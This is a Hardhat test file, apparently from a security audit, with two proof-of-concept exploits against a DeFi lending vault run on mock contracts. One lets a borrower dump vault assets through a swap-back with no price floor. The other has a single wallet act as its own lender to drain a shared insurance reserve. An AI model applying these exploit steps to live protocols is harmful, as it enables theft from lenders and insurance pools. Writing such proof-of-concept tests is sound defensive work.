const { expect } = require("chai");
const { loadFixture, time } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

// Krait PoCs. Production tier defaults from the AssetRegistry constructor are
// left in place (BlueChip: 10% floor, 100% exposure, 100bps premium).
const E = ethers.parseEther;
const POOL_FEE = 3000;

async function stack() {
  const [operator, lender, borrower, attacker] = await ethers.getSigners();
  const Mock = await ethers.getContractFactory("MockERC20", operator);
  const weth = await Mock.deploy("Mock WETH", "WETH", 18);
  const usdx = await Mock.deploy("Mock USDX", "USDX", 18);

  const aave = await (await ethers.getContractFactory("MockAavePool", operator)).deploy();
  const router = await (await ethers.getContractFactory("MockSwapRouter", operator)).deploy();
  const uniFactory = await (await ethers.getContractFactory("MockUniswapV3Factory", operator)).deploy();
  const uniPool = await (await ethers.getContractFactory("MockUniswapV3Pool", operator)).deploy();
  await uniFactory.setPool(await weth.getAddress(), await usdx.getAddress(), POOL_FEE, await uniPool.getAddress());
  await uniPool.setAvgTick(0);                                   // TWAP 1:1
  await router.setRate(await weth.getAddress(), await usdx.getAddress(), 1, 1);
  await router.setRate(await usdx.getAddress(), await weth.getAddress(), 1, 1);
  await weth.mint(await router.getAddress(), E("1000"));
  await usdx.mint(await router.getAddress(), E("1000"));

  const kyc = await (await ethers.getContractFactory("KYCRegistry", operator)).deploy(operator.address, operator.address, 0);
  await kyc.verify(borrower.address);
  await kyc.verify(attacker.address);

  const registry = await (await ethers.getContractFactory("AssetRegistry", operator)).deploy(
    operator.address, await aave.getAddress(), await router.getAddress(), await uniFactory.getAddress(), await weth.getAddress());
  await registry.addAssetWithTier(await weth.getAddress(), ethers.ZeroAddress, 0, ethers.ZeroAddress, 0, 0);
  await registry.addAssetWithTier(await usdx.getAddress(), ethers.ZeroAddress, 0, ethers.ZeroAddress, 0, 0);

  const pool = await (await ethers.getContractFactory("InsurancePool", operator)).deploy(operator.address, 1000, 0);
  const twapLib = await (await ethers.getContractFactory("UniswapTwap", operator)).deploy();
  const impl = await (await ethers.getContractFactory("Vault", { signer: operator, libraries: { UniswapTwap: await twapLib.getAddress() } })).deploy();
  const factory = await (await ethers.getContractFactory("VaultFactory", operator)).deploy(
    await kyc.getAddress(), await registry.getAddress(), await pool.getAddress(), operator.address, await impl.getAddress(), 0);
  await pool.setVaultFactory(await factory.getAddress());

  // Insurance reserve funded by other borrowers' premiums: 100 WETH.
  await weth.mint(operator.address, E("100"));
  await weth.approve(await pool.getAddress(), E("100"));
  await pool.fund(await weth.getAddress(), E("100"));

  return { operator, lender, borrower, attacker, weth, usdx, router, registry, pool, factory };
}

describe("Krait PoC", function () {

  it("KRAIT-001: swapBack has no TWAP floor — borrower sells held assets at 1% of fair value", async function () {
    const { lender, borrower, weth, usdx, router, pool, factory } = await loadFixture(stack);
    const P = E("10"), D = E("1.5"), DAYS = 7;

    await weth.mint(lender.address, P);
    await weth.connect(lender).approve(await factory.getAddress(), P);
    await factory.connect(lender).deployVaultWithTier(await weth.getAddress(), borrower.address, P, 1200, DAYS, false, D, ethers.ZeroAddress, 0);
    const vault = await ethers.getContractAt("Vault", await factory.allVaults(0));

    const premium = await vault.insurancePremium();
    await weth.mint(borrower.address, D + premium);
    await weth.connect(borrower).approve(await vault.getAddress(), D + premium);
    await vault.connect(borrower).payDeposit();

    // Fair entry: 8 WETH -> 8 USDX at TWAP. Entry-impact and exposure checks pass.
    await vault.connect(borrower).swap(await usdx.getAddress(), E("8"), 1, POOL_FEE);

    // Borrower's own front-run moves the pool's spot price (TWAP unchanged at 1:1).
    await router.setRate(await usdx.getAddress(), await weth.getAddress(), 1, 100);

    // swapBack accepts any minAmountOut > 0: 8 USDX (TWAP value 8 WETH) sold for 0.08 WETH.
    await vault.connect(borrower).swapBack(await usdx.getAddress(), E("8"), 1);
    expect(await weth.balanceOf(await vault.getAddress())).to.equal(E("3.58")); // 2 + 1.5 + 0.08

    await time.increase(DAYS * 86400 + 1);
    await vault.connect(lender).settle();

    const target = P + (await vault.settledFee());
    const lenderPaid = await vault.settledLenderPayout();
    console.log("      lender target", ethers.formatEther(target), "paid", ethers.formatEther(lenderPaid),
                "insurance draw", ethers.formatEther(await vault.settledInsuranceDraw()));
    // HARM: the lender recovers ~4.58 of 10.23 owed; ~5.6 WETH of principal is gone
    // even after the deposit and the full insurance draw.
    expect(target - lenderPaid).to.be.gt(E("5"));
  });

  it("KRAIT-002: one KYC'd wallet, acting as its own lender, drains the insurance reserve", async function () {
    const { attacker, weth, pool, factory } = await loadFixture(stack);
    const P = E("10"), D = E("1");          // BlueChip floor at 60s is the 10% tier minimum
    const APR = 2_000_000_000n;              // no upper bound on aprBps
    const TERM = 60;                         // seconds (useSeconds = true)

    await weth.mint(attacker.address, E("20"));
    const start = await weth.balanceOf(attacker.address);
    const reserve0 = await pool.reserveOf(await weth.getAddress());

    for (let i = 0; i < 5; i++) {
      await weth.connect(attacker).approve(await factory.getAddress(), P);
      // lender == borrower == attacker
      await factory.connect(attacker).deployVaultWithTier(await weth.getAddress(), attacker.address, P, APR, TERM, true, D, ethers.ZeroAddress, 0);
      const vault = await ethers.getContractAt("Vault", await factory.allVaults(i));
      const premium = await vault.insurancePremium();
      await weth.connect(attacker).approve(await vault.getAddress(), D + premium);
      await vault.connect(attacker).payDeposit();
      await time.increase(TERM + 1);
      await vault.connect(attacker).settle();  // no held assets: anyone may settle
    }

    const gained = (await weth.balanceOf(attacker.address)) - start;
    const drained = reserve0 - (await pool.reserveOf(await weth.getAddress()));
    console.log("      attacker net gain", ethers.formatEther(gained), "reserve drained", ethers.formatEther(drained));
    // HARM: 5 WETH (10% of principal per loop) moves from the shared reserve to the attacker.
    expect(drained).to.be.gt(E("4.99"));   // 5 WETH drawn, less ~1e-6 of premiums paid back in
    expect(gained).to.be.gt(E("4.99"));
  });
});
